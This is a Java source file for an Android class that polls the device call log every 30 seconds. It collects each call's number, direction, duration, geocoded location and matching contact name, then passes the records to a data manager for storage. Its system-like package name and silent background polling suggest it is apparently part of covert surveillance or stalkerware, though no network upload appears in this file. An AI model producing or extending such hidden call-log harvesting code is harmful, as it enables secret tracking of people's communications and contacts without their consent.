package com.system.service.manager;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Call Manager - Handles call log monitoring and data collection
 * Monitors incoming, outgoing, and missed calls
 */
public class CallManager {
    
    private static final String TAG = "CallManager";
    private static final long CALL_CHECK_INTERVAL = 30000; // 30 seconds
    
    private Context context;
    private DataManager dataManager;
    private Handler handler;
    private ExecutorService executorService;
    
    private boolean isMonitoring = false;
    private long lastCallTimestamp = 0;
    
    public CallManager(Context context, DataManager dataManager) {
        this.context = context;
        this.dataManager = dataManager;
        this.handler = new Handler(Looper.getMainLooper());
        this.executorService = Executors.newSingleThreadExecutor();
        
        // Get initial timestamp to avoid sending old calls
        initializeLastCallTimestamp();
    }
    
    /**
     * Initialize last call timestamp to current time
     */
    private void initializeLastCallTimestamp() {
        lastCallTimestamp = System.currentTimeMillis();
    }
    
    /**
     * Start call monitoring
     */
    public void startCallMonitoring() {
        if (isMonitoring) {
            Log.d(TAG, "Call monitoring already started");
            return;
        }
        
        if (!hasCallLogPermission()) {
            Log.e(TAG, "Call log permission not granted");
            return;
        }
        
        isMonitoring = true;
        Log.d(TAG, "Call monitoring started");
        
        // Start periodic call checking
        scheduleCallCheck();
    }
    
    /**
     * Stop call monitoring
     */
    public void stopCallMonitoring() {
        if (!isMonitoring) {
            return;
        }
        
        isMonitoring = false;
        handler.removeCallbacksAndMessages(null);
        Log.d(TAG, "Call monitoring stopped");
    }
    
    /**
     * Schedule periodic call checking
     */
    private void scheduleCallCheck() {
        if (!isMonitoring) {
            return;
        }
        
        handler.postDelayed(() -> {
            executorService.execute(this::checkForNewCalls);
            scheduleCallCheck(); // Schedule next check
        }, CALL_CHECK_INTERVAL);
    }
    
    /**
     * Check for new call log entries
     */
    private void checkForNewCalls() {
        if (!hasCallLogPermission()) {
            return;
        }
        
        ContentResolver resolver = context.getContentResolver();
        String selection = CallLog.Calls.DATE + " > ?";
        String[] selectionArgs = {String.valueOf(lastCallTimestamp)};
        String sortOrder = CallLog.Calls.DATE + " DESC";
        
        try (Cursor cursor = resolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            selection,
            selectionArgs,
            sortOrder
        )) {
            if (cursor != null && cursor.moveToFirst()) {
                long newestTimestamp = lastCallTimestamp;
                
                do {
                    Map<String, Object> callData = extractCallData(cursor);
                    if (callData != null) {
                        dataManager.storeCallData(callData);
                        
                        long callTime = getLong(cursor, CallLog.Calls.DATE);
                        if (callTime > newestTimestamp) {
                            newestTimestamp = callTime;
                        }
                        
                        Log.d(TAG, String.format("New call: %s %s for %d seconds", 
                            getCallTypeString(getInt(cursor, CallLog.Calls.TYPE)),
                            getString(cursor, CallLog.Calls.NUMBER),
                            getInt(cursor, CallLog.Calls.DURATION)));
                    }
                } while (cursor.moveToNext());
                
                // Update last timestamp
                if (newestTimestamp > lastCallTimestamp) {
                    lastCallTimestamp = newestTimestamp;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking for new calls", e);
        }
    }
    
    /**
     * Extract call data from cursor
     */
    private Map<String, Object> extractCallData(Cursor cursor) {
        try {
            Map<String, Object> callData = new HashMap<>();
            
            // Basic call information
            String number = getString(cursor, CallLog.Calls.NUMBER);
            int type = getInt(cursor, CallLog.Calls.TYPE);
            long date = getLong(cursor, CallLog.Calls.DATE);
            int duration = getInt(cursor, CallLog.Calls.DURATION);
            
            callData.put("phone_number", number);
            callData.put("type", getCallTypeString(type));
            callData.put("type_code", type);
            callData.put("date", date);
            callData.put("duration", duration);
            callData.put("timestamp", date);
            
            // Additional call details
            callData.put("cached_name", getString(cursor, CallLog.Calls.CACHED_NAME));
            callData.put("cached_number_type", getInt(cursor, CallLog.Calls.CACHED_NUMBER_TYPE));
            callData.put("cached_number_label", getString(cursor, CallLog.Calls.CACHED_NUMBER_LABEL));
            callData.put("is_read", getInt(cursor, CallLog.Calls.IS_READ));
            callData.put("new", getInt(cursor, CallLog.Calls.NEW));
            callData.put("country_iso", getString(cursor, CallLog.Calls.COUNTRY_ISO));
            callData.put("geocoded_location", getString(cursor, CallLog.Calls.GEOCODED_LOCATION));
            
            // Enhanced data
            callData.put("duration_formatted", formatDuration(duration));
            callData.put("call_direction", getCallDirection(type));
            callData.put("call_status", getCallStatus(type, duration));
            
            // Contact name lookup
            String contactName = getContactName(number);
            if (contactName != null) {
                callData.put("contact_name", contactName);
            }
            
            return callData;
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting call data", e);
            return null;
        }
    }
    
    /**
     * Get call type as string
     */
    private String getCallTypeString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "missed";
            case CallLog.Calls.VOICEMAIL_TYPE:
                return "voicemail";
            case CallLog.Calls.REJECTED_TYPE:
                return "rejected";
            case CallLog.Calls.BLOCKED_TYPE:
                return "blocked";
            case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                return "answered_externally";
            default:
                return "unknown";
        }
    }
    
    /**
     * Get call direction
     */
    private String getCallDirection(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
            case CallLog.Calls.MISSED_TYPE:
            case CallLog.Calls.VOICEMAIL_TYPE:
            case CallLog.Calls.REJECTED_TYPE:
            case CallLog.Calls.BLOCKED_TYPE:
            case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                return "inbound";
            case CallLog.Calls.OUTGOING_TYPE:
                return "outbound";
            default:
                return "unknown";
        }
    }
    
    /**
     * Get call status
     */
    private String getCallStatus(int type, int duration) {
        if (type == CallLog.Calls.MISSED_TYPE) {
            return "missed";
        } else if (type == CallLog.Calls.REJECTED_TYPE) {
            return "rejected";
        } else if (type == CallLog.Calls.BLOCKED_TYPE) {
            return "blocked";
        } else if (duration > 0) {
            return "answered";
        } else {
            return "no_answer";
        }
    }
    
    /**
     * Format duration in human readable format
     */
    private String formatDuration(int seconds) {
        if (seconds < 60) {
            return seconds + "s";
        } else if (seconds < 3600) {
            int minutes = seconds / 60;
            int remainingSeconds = seconds % 60;
            return minutes + "m " + remainingSeconds + "s";
        } else {
            int hours = seconds / 3600;
            int minutes = (seconds % 3600) / 60;
            int remainingSeconds = seconds % 60;
            return hours + "h " + minutes + "m " + remainingSeconds + "s";
        }
    }
    
    /**
     * Get contact name for phone number
     */
    private String getContactName(String phoneNumber) {
        if (phoneNumber == null || phoneNumber.isEmpty()) {
            return null;
        }
        
        try {
            ContentResolver resolver = context.getContentResolver();
            Uri uri = Uri.withAppendedPath(
                android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber)
            );
            
            try (Cursor cursor = resolver.query(uri, 
                new String[]{android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME}, 
                null, null, null)) {
                
                if (cursor != null && cursor.moveToFirst()) {
                    return cursor.getString(0);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting contact name for " + phoneNumber, e);
        }
        
        return null;
    }
    
    /**
     * Safe string extraction from cursor
     */
    private String getString(Cursor cursor, String columnName) {
        try {
            int columnIndex = cursor.getColumnIndex(columnName);
            return columnIndex >= 0 ? cursor.getString(columnIndex) : "";
        } catch (Exception e) {
            return "";
        }
    }
    
    /**
     * Safe long extraction from cursor
     */
    private long getLong(Cursor cursor, String columnName) {
        try {
            int columnIndex = cursor.getColumnIndex(columnName);
            return columnIndex >= 0 ? cursor.getLong(columnIndex) : 0;
        } catch (Exception e) {
            return 0;
        }
    }
    
    /**
     * Safe int extraction from cursor
     */
    private int getInt(Cursor cursor, String columnName) {
        try {
            int columnIndex = cursor.getColumnIndex(columnName);
            return columnIndex >= 0 ? cursor.getInt(columnIndex) : 0;
        } catch (Exception e) {
            return 0;
        }
    }
    
    /**
     * Check if call log permission is granted
     */
    private boolean hasCallLogPermission() {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) 
            == PackageManager.PERMISSION_GRANTED;
    }
    
    /**
     * Get call statistics
     */
    public Map<String, Object> getCallStatistics() {
        Map<String, Object> stats = new HashMap<>();
        
        try {
            if (hasCallLogPermission()) {
                ContentResolver resolver = context.getContentResolver();
                
                // Count total calls
                try (Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)) {
                    stats.put("total_calls", cursor != null ? cursor.getCount() : 0);
                }
                
                // Count missed calls
                String missedSelection = CallLog.Calls.TYPE + " = ?";
                String[] missedArgs = {String.valueOf(CallLog.Calls.MISSED_TYPE)};
                try (Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, null, missedSelection, missedArgs, null)) {
                    stats.put("missed_calls", cursor != null ? cursor.getCount() : 0);
                }
                
                // Count outgoing calls
                String outgoingSelection = CallLog.Calls.TYPE + " = ?";
                String[] outgoingArgs = {String.valueOf(CallLog.Calls.OUTGOING_TYPE)};
                try (Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, null, outgoingSelection, outgoingArgs, null)) {
                    stats.put("outgoing_calls", cursor != null ? cursor.getCount() : 0);
                }
                
                // Count incoming calls
                String incomingSelection = CallLog.Calls.TYPE + " = ?";
                String[] incomingArgs = {String.valueOf(CallLog.Calls.INCOMING_TYPE)};
                try (Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, null, incomingSelection, incomingArgs, null)) {
                    stats.put("incoming_calls", cursor != null ? cursor.getCount() : 0);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting call statistics", e);
        }
        
        stats.put("monitoring_active", isMonitoring);
        stats.put("last_check_timestamp", lastCallTimestamp);
        
        return stats;
    }
    
    /**
     * Force call sync
     */
    public void forceCallSync() {
        if (isMonitoring && hasCallLogPermission()) {
            executorService.execute(this::checkForNewCalls);
        }
    }
}